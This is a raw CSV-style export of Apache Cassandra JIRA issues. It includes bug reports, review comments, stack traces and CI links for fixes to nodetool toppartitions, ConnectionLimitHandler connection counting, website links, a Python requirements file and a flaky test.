@@ -550,6 +550,14 @@ public void startup(ICluster cluster)
         sync(() -> {
             try
             {
+                if (config.has(GOSSIP))
+                {
+                    // TODO: hacky
+                    System.setProperty(""cassandra.ring_delay_ms"", ""5000"");

Review comment:
       Yes indeed, well spotted.
   




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;12/Jan/22 23:06;githubbot;600","smiklosovic closed pull request #1397:
URL: https://github.com/apache/cassandra/pull/1397


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:27;githubbot;600","smiklosovic closed pull request #1395:
URL: https://github.com/apache/cassandra/pull/1395


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:27;githubbot;600","smiklosovic closed pull request #1396:
URL: https://github.com/apache/cassandra/pull/1396


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:27;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,benedict,jonmeredith,maedhroz,marcuse,,,,,,,,,,,Code,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Feb 03 09:00:06 UTC 2022,,,,,,,All,,,,"0|z0yheg:",9223372036854775807,,,,maedhroz,,,,Low,,3.0.19,,https://github.com/apache/cassandra/commit/1413dbebc398af55df267f92c397d537ee4bef82,,,,,,,,,Execute in-jvm dtests suite.,,,,,"12/Jan/22 00:44;jonmeredith;PRs
[3.0|http://https://github.com/apache/cassandra/pull/1395] - 3.0 & 3.11 (clean patch)
[4.0|https://github.com/apache/cassandra/pull/1396] - 4.0
[trunk|https://github.com/apache/cassandra/pull/1397] - minor diffs from simulator

Branches
[3.0|https://github.com/jonmeredith/cassandra/tree/C17256-3.0] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17256-3.0]
[3.11|https://github.com/jonmeredith/cassandra/tree/C17256-3.11] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17256-3.11]
[4.0|https://github.com/jonmeredith/cassandra/tree/C17256-4.0] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17256-4.0]
[trunk|https://github.com/jonmeredith/cassandra/tree/C17256-trunk] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17256-trunk]
;;;","12/Jan/22 20:32;maedhroz;+1

Left some minor comment in the PRs.;;;","13/Jan/22 00:42;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-3.0-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-3.0-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1366/]|
|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-3.11-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-3.11-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1367/]|
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-4.0-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-4.0-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1368/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-trunk-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-trunk-E9B2274D-8700-4B7A-B4C7-2700AE3EC2F3]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1369/]|
;;;","27/Jan/22 18:23;jonmeredith;Stalled so trying again

CI Results (pending):

||Branch||Source||Circle CI||Jenkins||

|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-3.0-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-3.0-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|unknown]|

|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-3.11-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-3.11-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|unknown]|

|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-4.0-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-4.0-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|unknown]|

|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-trunk-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-trunk-6C910E6D-CD2D-4B63-B252-EBF58A6DF3D8]|[build|unknown]|;;;","03/Feb/22 01:03;jonmeredith;Fixed my Jenkins auth so those should be running now.  I've included the fix [~benedict] found for the in-jvm dtest classloader reference being held and a change to handle PathUtils.DeleteOnExit properly during in-JVM dtests and whenever shutdown hooks are deregistered. I've left the split of the distributed BootstrapTest  that was needed to workaround the classloader issue to make it better for parallelizing.

 

CI Results (pending):

||Branch||Source||Circle CI||Jenkins||

|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-3.0-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-3.0-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1387/]|

|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-3.11-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-3.11-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1388/]|

|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-cassandra-4.0-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-cassandra-4.0-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1389/]|

|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17256-trunk-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17256-trunk-0D261E03-AB30-458C-8737-EE7313FD820C]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1390/]|;;;","03/Feb/22 09:00;benedict;Test changes LGTM;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
nodetool toppartitions can fail because ByteBuffer.array() returns more bytes than would be considered valid by UTF8Serializer.validate,CASSANDRA-17254,13421838,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jwest,jwest,jwest,11/Jan/22 00:38,22/Jun/23 15:21,13/Jul/23 08:40,30/Nov/22 02:36,3.0.29,,,,,,Tool/nodetool,,,,0,,"The error below is caused by the use of [{{ByteBuffer.array()}}|https://github.com/apache/cassandra/blob/cassandra-3.0/src/java/org/apache/cassandra/db/ColumnFamilyStore.java#L1628]. Doing so not only makes the hex key potentially incorrect but causes invalid data to be passed to {{AbstractType.getString}} and ultimately {{UTF8Validator.validate}}. 

{code}
error: String didn't validate.
-- StackTrace --
org.apache.cassandra.serializers.MarshalException: String didn't validate.
	at org.apache.cassandra.serializers.UTF8Serializer.validate(UTF8Serializer.java:35)
	at org.apache.cassandra.db.marshal.AbstractType.getString(AbstractType.java:129)
	at org.apache.cassandra.db.ColumnFamilyStore.finishLocalSampling(ColumnFamilyStore.java:1633)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}",,brandon.williams,jwest,superwangcheng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jwest,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Nov 30 02:36:41 UTC 2022,,,,,,,All,,,,"0|z0yfzs:",9223372036854775807,,,,brandon.williams,superwangcheng,,,Normal,,3.0.29,,https://github.com/apache/cassandra/commit/13d495aa7d5b7a7c121fcc9e105f79107c5c2a1c,,,,,,,,,manual / production ,,,,,"11/Jan/22 00:44;jwest;https://github.com/apache/cassandra/compare/cassandra-3.0...jrwest:jwest/17254-3.0;;;","07/Nov/22 19:12;brandon.williams;Can we add a test for this?;;;","07/Nov/22 19:31;jwest;I'm generally +1 on adding tests but it looks like it will be somewhat cumbersome for this function. Any recommendations on approaches? I was thinking maybe an in-JVM dtest but the key has to be a certain format to trigger the issue. On the other hand, the usage of the ByteBuffer API here is definitely wrong. Thoughts? ;;;","07/Nov/22 22:13;superwangcheng;+1. Approved. ;;;","07/Nov/22 22:26;brandon.williams;bq. I was thinking maybe an in-JVM dtest but the key has to be a certain format to trigger the issue. On the other hand, the usage of the ByteBuffer API here is definitely wrong. Thoughts?

You're right, that's a lot of effort to trigger it.  The usage is definitely wrong though, that person didn't know what they were doing (it was me.)

3.11 doesn't seem to have this problem and uses ByteBufferUtil.bytesToHex instead, any reason not to just backport that solution to 3.0?;;;","07/Nov/22 22:37;jwest;If I am reading the 3.11 code right (pasted below jic), it uses {{bytesToHex}} for the key but just uses the {{ByteBuffer}} directly unlike my patch which duplicates it for the value. I am fine with the 3.11 approach as well assuming the comment is correct:
{code:java}
//Not duplicating the buffer for safety because AbstractSerializer and ByteBufferUtil.bytesToHex
//don't modify position or limit
ByteBuffer key = counter.getItem();
result.put(new CompositeDataSupport(COUNTER_COMPOSITE_TYPE, COUNTER_NAMES, new Object[] {
        ByteBufferUtil.bytesToHex(key), // raw
        counter.getCount(),  // count
        counter.getError(),  // error
        metadata.getKeyValidator().getString(key) })); // string {code}
 ;;;","07/Nov/22 22:44;brandon.williams;That was from CASSANDRA-9241 and seems trustworthy to me.;;;","09/Nov/22 21:26;jwest;Updated the branch linked above with the 3.11 code and kicked off tests  [here|https://app.circleci.com/pipelines/github/jrwest/cassandra/112/workflows/4c88ab60-cd11-4579-b4ee-d8f3c241d6fc];;;","09/Nov/22 22:26;brandon.williams;+1;;;","30/Nov/22 02:36;jwest;Commited as https://github.com/apache/cassandra/commit/13d495aa7d5b7a7c121fcc9e105f79107c5c2a1c;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dead links on website ,CASSANDRA-17253,13421837,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,,alexander92,alexander92,11/Jan/22 00:28,11/Jan/22 08:35,13/Jul/23 08:40,11/Jan/22 08:35,NA,,,,,,Documentation/Website,,,,0,,It seems all of the links in the Nav bar are dead. ,,alexander92,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16765,,,,,,,,,,,,,,,"11/Jan/22 00:28;alexander92;Screen Shot 2022-01-10 at 7.27.32 PM.png;https://issues.apache.org/jira/secure/attachment/13038545/Screen+Shot+2022-01-10+at+7.27.32+PM.png",,,,,1.0,,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jan 11 08:34:31 UTC 2022,,,,,,,All,,,,"0|z0yfzk:",9223372036854775807,,,,,,,,Normal,,,,,,,,,,,,,,,,,,"11/Jan/22 00:37;brandon.williams;/cc [~mck] I can confirm these are broken.;;;","11/Jan/22 08:34;mck;Thanks for the report [~alexander92]!

To be accurate, all top bar nav links when in the Documentation (in-tree) docs are broken.

This was already fixed in trunk (and cassandra.staged.apache.org), so I just pushed staged out to prod.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConnectionLimitHandler may leaks connection count if remote connection drops,CASSANDRA-17252,13421835,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,11/Jan/22 00:10,27/May/22 19:24,13/Jul/23 08:40,19/Mar/22 14:17,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Messaging/Client,,,,0,,"In some cases, Netty does not return the original IP used for per-IP counting when the channel becomes inactive,
which throws an NPE before decrementing the active per-IP count.


{code:java}
java.lang.NullPointerException
at org.apache.cassandra.transport.ConnectionLimitHandler.channelInactive(ConnectionLimitHandler.java:101)
       at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:262)
       at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:248)
       at io.netty.channel.AbstractChannelHandlerContext.fireChannelInactive(AbstractChannelHandlerContext.java:241)
       at io.netty.handler.codec.ByteToMessageDecoder.channelInputClosed(ByteToMessageDecoder.java:389)
       at io.netty.handler.codec.ByteToMessageDecoder.channelInactive(ByteToMessageDecoder.java:354)
       at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:262)
       at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:248)
       at io.netty.channel.AbstractChannelHandlerContext.fireChannelInactive(AbstractChannelHandlerContext.java:241)
       at io.netty.channel.DefaultChannelPipeline$HeadContext.channelInactive(DefaultChannelPipeline.java:1405)
       at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:262)
       at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:248)
       at io.netty.channel.DefaultChannelPipeline.fireChannelInactive(DefaultChannelPipeline.java:901)
       at io.netty.channel.AbstractChannel$AbstractUnsafe$8.run(AbstractChannel.java:819)
       at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:164)
       at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:472)
       at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:497)
       at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
       at java.base/java.lang.Thread.run(Thread.java:834)
{code}
",,jonmeredith,maedhroz,,,,,,,,,,,,,"jonmeredith commented on pull request #1385:
URL: https://github.com/apache/cassandra/pull/1385#issuecomment-1073018335


   Committed.


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;19/Mar/22 14:18;githubbot;600","jonmeredith closed pull request #1385:
URL: https://github.com/apache/cassandra/pull/1385


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;19/Mar/22 14:18;githubbot;600","jonmeredith commented on pull request #1386:
URL: https://github.com/apache/cassandra/pull/1386#issuecomment-1073018369


   Committed.


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;19/Mar/22 14:19;githubbot;600","jonmeredith closed pull request #1386:
URL: https://github.com/apache/cassandra/pull/1386


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;19/Mar/22 14:19;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Degradation -> Resource Management,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Mar 18 23:29:28 UTC 2022,,,,,,,All,,,,"0|z0yfz4:",9223372036854775807,,,,maedhroz,,,,Low,,2.0.15,,https://github.com/apache/cassandra/commit/ad532ef1ddd07eaa3cea658b7b3bbdf13bd1bdb4,,,,,,,,,Rely on existing client tests.  The exception is hard to reliably provoke - I ended up running many iterations on my laptop with breakpoints set to hit the null while looping connections.,,,,,"11/Jan/22 00:16;jonmeredith;Looks like the issue was present since

initial commit in CASSANDRA-8086 / e56d9efb7c1 , but perhaps Netty behaved differently pre-tcnative.;;;","11/Jan/22 00:42;jonmeredith;Branches
[3.0|https://github.com/jonmeredith/cassandra/tree/C17252-connection-limit-handler-may-leak-per-ip-count-3.0]
[3.11|https://github.com/jonmeredith/cassandra/tree/C17252-connection-limit-handler-may-leak-per-ip-count-3.11]
[4.0|https://github.com/jonmeredith/cassandra/tree/C17252-connection-limit-handler-may-leak-per-ip-count-4.0]
[trunk|https://github.com/jonmeredith/cassandra/tree/C17252-connection-limit-handler-may-leak-per-ip-count-trunk]

[PR for 3.0/3.11 version|https://github.com/apache/cassandra/pull/1385]
[PR for 4.0/trunk version|https://github.com/apache/cassandra/pull/1386] noSpamLogger is the only difference.

CircleCI
[3.0|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17252-connection-limit-handler-may-leak-per-ip-count-3.0&filter=all]
[3.11|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17252-connection-limit-handler-may-leak-per-ip-count-3.11&filter=all]
[4.0|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17252-connection-limit-handler-may-leak-per-ip-count-4.0&filter=all]
[trunk|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17252-connection-limit-handler-may-leak-per-ip-count-trunk&filter=all]

;;;","11/Jan/22 17:49;maedhroz;+1 on both PRs, although the 3.0 PR seems to have {{trunk}} as its base.

Also, I'm not sure WTH is going on w/ the CircleCi runs: https://app.circleci.com/pipelines/github/jonmeredith/cassandra/545/workflows/c06ad8f5-5a4d-42fe-a126-a3da09ca8149/jobs/2553

Looks like [~jmckenzie] also ran into this: https://github.com/apache/cassandra/pull/1205/commits/1598b958d7cce3a81e1a44c27f08eb0b5a4c94a4;;;","18/Mar/22 23:29;jonmeredith;Starting commit

 

CI Results (pending):

||Branch||Source||Circle CI||Jenkins||

|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17252-cassandra-3.0-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17252-cassandra-3.0-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1519/]|

|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17252-cassandra-3.11-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17252-cassandra-3.11-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1520/]|

|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17252-cassandra-4.0-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17252-cassandra-4.0-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1521/]|

|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17252-trunk-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17252-trunk-D9AE02F1-3571-40CD-ACDC-7FA701325BEB]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1522/]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove unused dependencies from pylib/requirements.txt,CASSANDRA-17247,13421555,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bschoeni,bschoeni,bschoeni,09/Jan/22 16:34,27/May/22 19:24,13/Jul/23 08:40,20/Jan/22 16:04,4.0.2,4.1,4.1-alpha1,,,,CQL/Interpreter,,,,0,,"The dependency 'cql' appears to be obsolete in requirements.txt and is not imported by the python code.

The package 'cql' was last updated in 2012 and has been deprecated by its authors

     [https://pypi.org/project/cql|https://pypi.org/project/cql/]    (see release history)

     _A DB-API 2.0 compliant client library for Cassandra/CQL_

     _This driver has been {*}deprecated{*}. Please use python-driver [https://github.com/datastax/python-driver] instead._

    above from homepage at  [https://code.google.com/archive/a/apache-extras.org/p/cassandra-dbapi2|https://code.google.com/archive/a/apache-extras.org/p/cassandra-dbapi2_]",,bereng,bschoeni,jeffwidman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/22 02:44;bschoeni;17247-removed-obsolete-cql-dependency.patch;https://issues.apache.org/jira/secure/attachment/13038458/17247-removed-obsolete-cql-dependency.patch",,,,,1.0,bschoeni,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jan 20 16:04:24 UTC 2022,,,,,,,All,,,,"0|z0ye8w:",9223372036854775807,,,,bereng,brandon.williams,,,Low,,NA,,https://github.com/apache/cassandra/commit/8c8d9b8e5743825c47c7743c7bbfd062533e1602,,,,,,,,,run CI,,,,,"18/Jan/22 20:17;jeffwidman;nudge [~brandon.williams] this should be trivial 1-line patch to review and confirm via CI.;;;","18/Jan/22 20:29;brandon.williams;||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17247]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra?branch=CASSANDRA-17247&filter=all]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17247-trunk]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra?branch=CASSANDRA-17247-trunk&filter=all]|;;;","18/Jan/22 22:10;brandon.williams;Failures are known or timeouts, +1.;;;","20/Jan/22 07:37;bereng;I agree and lgtm +1;;;","20/Jan/22 16:04;brandon.williams;Committed, thank you!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix org.apache.cassandra.distributed.test.trackwarnings.TombstoneCountWarningTest.failThresholdSinglePartition,CASSANDRA-17244,13421500,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,e.dimitrova,e.dimitrova,08/Jan/22 23:15,17/Jun/22 07:28,13/Jul/23 08:40,06/Jun/22 20:34,NA,,,,,,CI,,,,0,,"org.apache.cassandra.distributed.test.trackwarnings.TombstoneCountWarningTest.failThresholdSinglePartition failed [here|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1354/testReport/junit/org.apache.cassandra.distributed.test.trackwarnings/TombstoneCountWarningTest/failThresholdSinglePartition/]

I didn't find any other occurrences but seems to me legit failure.

CC [~dcapwell] as I think you were working on those and probably you will make better assessment than me. :) ",,adelapena,azotcsit,dcapwell,e.dimitrova,jlewandowski,maedhroz,,,,,,,,,"dcapwell commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889119107


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -68,10 +84,12 @@ public class TombstoneCountWarningTest extends TestBaseImpl
     @BeforeClass
     public static void setupClass() throws IOException
     {
+        logger.info(""[test step : @BeforeClass] setupClass"");

Review Comment:
   these tests have very similar logs, so while debugging if we do not annotate test start its very hard to debug



;03/Jun/22 16:11;githubbot;600","dcapwell commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889120536


##########
